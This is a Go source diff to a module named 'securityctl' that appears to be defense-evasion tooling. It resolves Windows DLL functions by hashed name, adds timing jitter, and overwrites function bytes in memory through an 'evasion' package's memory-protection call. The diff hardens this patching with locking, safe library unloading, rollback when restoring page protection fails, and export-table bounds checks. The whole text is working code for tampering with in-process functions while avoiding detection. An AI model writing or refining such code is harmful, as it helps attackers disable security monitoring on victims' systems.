@@ -7,6 +7,7 @@ import (
 	"errors"
 	"fmt"
 	mrand "math/rand"
+	"sync"
 	"syscall"
 	"time"
 	"unicode/utf16"
@@ -22,6 +23,7 @@ const (
 )
 
 type funcPatch struct {
+	mu       sync.Mutex
 	addr     uintptr
 	orig     []byte
 	patch    []byte
@@ -160,7 +162,16 @@ func resolveFuncByHash(dllName, funcName string) (*funcPatch, error) {
 	jitter(1*time.Millisecond, 5*time.Millisecond)
 	k32 := syscall.NewLazyDLL("kernel32.dll")
 	loadLibraryW := k32.NewProc("LoadLibraryW")
+	freeLibrary := k32.NewProc("FreeLibrary")
+	getModuleHandleW := k32.NewProc("GetModuleHandleW")
 	namePtr, _ := syscall.UTF16PtrFromString(dllName)
+
+	// Check if the module is already loaded. If it is, LoadLibraryW just
+	// increments the refcount and we can safely FreeLibrary later. If it
+	// isn't, LoadLibraryW is the one that brings it in and FreeLibrary
+	// would unload it — invalidating the resolved address.
+	alreadyLoaded, _, _ := getModuleHandleW.Call(uintptr(unsafe.Pointer(namePtr)))
+
 	modBase, _, _ := loadLibraryW.Call(uintptr(unsafe.Pointer(namePtr)))
 	if modBase == 0 {
 		return nil, fmt.Errorf("securityctl: LoadLibraryW(%s) failed", dllName)
@@ -168,6 +179,9 @@ func resolveFuncByHash(dllName, funcName string) (*funcPatch, error) {
 	jitter(500*time.Microsecond, 2*time.Millisecond)
 	fn, err := resolveExportAt(toPtr(modBase), djb2(funcName))
 	if err != nil {
+		if alreadyLoaded != 0 {
+			freeLibrary.Call(modBase)
+		}
 		return nil, fmt.Errorf("securityctl: resolve %s!%s: %w", dllName, funcName, err)
 	}
 	orig := make([]byte, patchLen)
@@ -177,6 +191,12 @@ func resolveFuncByHash(dllName, funcName string) (*funcPatch, error) {
 	origProt, qperr := queryProtection(uintptr(fn))
 	if qperr != nil {
 		origProt = pageRX
+	}
+	// Only release the loader reference if the module was already resident
+	// before our LoadLibraryW. Otherwise FreeLibrary would unload the DLL
+	// and invalidate the resolved function address.
+	if alreadyLoaded != 0 {
+		freeLibrary.Call(modBase)
 	}
 	jitter(100*time.Microsecond, 500*time.Microsecond)
 	return &funcPatch{
@@ -305,6 +325,8 @@ func resolveFuncFromKnownDlls(dllName, funcName string) (*funcPatch, error) {
 }
 
 func applyPatch(fp *funcPatch) error {
+	fp.mu.Lock()
+	defer fp.mu.Unlock()
 	if len(fp.patch) == 0 {
 		return errors.New("securityctl: no patch bytes")
 	}
@@ -319,13 +341,20 @@ func applyPatch(fp *funcPatch) error {
 	}
 	jitter(50*time.Microsecond, 200*time.Microsecond)
 	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, fp.origProt); err != nil {
-		return fmt.Errorf("securityctl: protect restore: %w", err)
+		// Protection restore failed — attempt to revert the patch bytes
+		// to avoid leaving the page writable with a half-applied patch.
+		for i := 0; i < len(fp.orig) && i < patchLen; i++ {
+			*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.orig[i]
+		}
+		return fmt.Errorf("securityctl: protect restore after patch: %w", err)
 	}
 	jitter(100*time.Microsecond, 500*time.Microsecond)
 	return nil
 }
 
 func restorePatch(fp *funcPatch) error {
+	fp.mu.Lock()
+	defer fp.mu.Unlock()
 	if len(fp.orig) == 0 {
 		return errors.New("securityctl: no original bytes")
 	}
@@ -337,7 +366,13 @@ func restorePatch(fp *funcPatch) error {
 		*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.orig[i]
 	}
 	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, fp.origProt); err != nil {
-		return fmt.Errorf("securityctl: protect restore: %w", err)
+		// Protection restore failed — the page is left writable with
+		// original bytes written. Attempt to re-apply the patch so the
+		// page is at least in a consistent (patched) state.
+		for i := 0; i < len(fp.patch) && i < patchLen; i++ {
+			*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.patch[i]
+		}
+		return fmt.Errorf("securityctl: protect restore after unpatch: %w", err)
 	}
 	return nil
 }
@@ -359,10 +394,25 @@ func resolveExportAt(base unsafe.Pointer, want uint32) (unsafe.Pointer, error) {
 	funcsRVA := uintptr(*(*uint32)(unsafe.Add(exp, 0x1C)))
 	namesRVA := uintptr(*(*uint32)(unsafe.Add(exp, 0x20)))
 	ordsRVA := uintptr(*(*uint32)(unsafe.Add(exp, 0x24)))
+	// Bounds-check that the export arrays are within the image.
+	if sizeOfImage > 0 {
+		if uintptr(expRVA) >= sizeOfImage {
+			return nil, errors.New("export directory outside image")
+		}
+		endNames := namesRVA + uintptr(numNames)*4
+		endOrds := ordsRVA + uintptr(numNames)*2
+		endFuncs := funcsRVA + uintptr(numFuncs)*4
+		if endNames > sizeOfImage || endOrds > sizeOfImage || endFuncs > sizeOfImage {
+			return nil, errors.New("export array extends beyond image")
+		}
+	}
 	for i := uint32(0); i < numNames; i++ {
 		nameRVA := *(*uint32)(unsafe.Add(base, namesRVA+uintptr(i)*4))
 		if nameRVA == 0 {
 			continue
+		}
+		if sizeOfImage > 0 && uintptr(nameRVA) >= sizeOfImage {
+			continue // skip malformed name entry
 		}
 		if hashExportName(unsafe.Add(base, uintptr(nameRVA))) == want {
 			ord := uint32(*(*uint16)(unsafe.Add(base, ordsRVA+uintptr(i)*2)))
@@ -376,7 +426,13 @@ func resolveExportAt(base unsafe.Pointer, want uint32) (unsafe.Pointer, error) {
 			if sizeOfImage > 0 && fnRVA >= sizeOfImage {
 				return nil, errors.New("export outside image")
 			}
-			return unsafe.Add(base, fnRVA), nil
+			fn := unsafe.Add(base, fnRVA)
+			// Verify 16 readable bytes at the function address are within
+			// the mapped image (not just that the RVA is in range).
+			if sizeOfImage > 0 && fnRVA+uintptr(patchLen) > sizeOfImage {
+				return nil, errors.New("export function extends beyond image")
+			}
+			return fn, nil
 		}
 	}
 	return nil, errors.New("export not found")
